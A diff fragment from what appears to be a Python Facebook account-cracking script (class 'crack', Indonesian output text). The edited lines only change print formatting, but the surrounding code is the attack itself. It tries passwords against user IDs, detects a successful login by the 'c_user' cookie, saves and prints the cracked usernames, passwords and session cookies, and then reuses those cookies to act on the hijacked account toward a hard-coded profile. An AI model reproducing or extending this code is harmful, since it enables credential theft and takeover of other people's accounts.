@@ -94,7 +94,7 @@ class crack:
 	def crack(self,user,lala,asu):
 		global ok,cp,cot,ajg
 		ua=awokawok(["Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE5-00/071.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.26 Mobile Safari/533.4 3gpp-gba",open("ua","r").read()])
-		print(f'\r[ CRACK ] {str(cot)}/{str(len(id))} | HASIL:OK/CP | {str(ok)}/{str(cp)}')
+		print(f'[ CRACK ] {str(cot)}/{str(len(id))} | HASIL:OK/CP | {str(ok)}/{str(cp)}')
 		if ajg!=user:
 			ajg=user
 			cot+=1
@@ -115,7 +115,7 @@ class crack:
 			if 'c_user' in d.cookies.get_dict().keys():
 				ok+=1
 				open('ok','a').write(user+' '+pw+'\n')
-				print(f'\r\33[32;1m(√) TIDAK CHECKPOINT (✓)\n(+) USER\t: {user}                         \nPASS\t: {pw}                         \nCOOKIES\t: {"".join(d.cookies.get_dict())}\n-------------------------------------------\33[37;1m                     \n',end='')
+				print(f'\33[32;1m(√) TIDAK CHECKPOINT (✓)\n(+) USER\t: {user}                         \nPASS\t: {pw}                         \nCOOKIES\t: {"".join(d.cookies.get_dict())}\n-------------------------------------------\33[37;1m                     \n',end='')
 				coki={"cookie":"".join(d.cookies.get_dict())}
 				r=parser(req.get(mb+"/100031928966181",cookies=coki).text,"html.parser")
 				for fllow in r.find_all("a"):
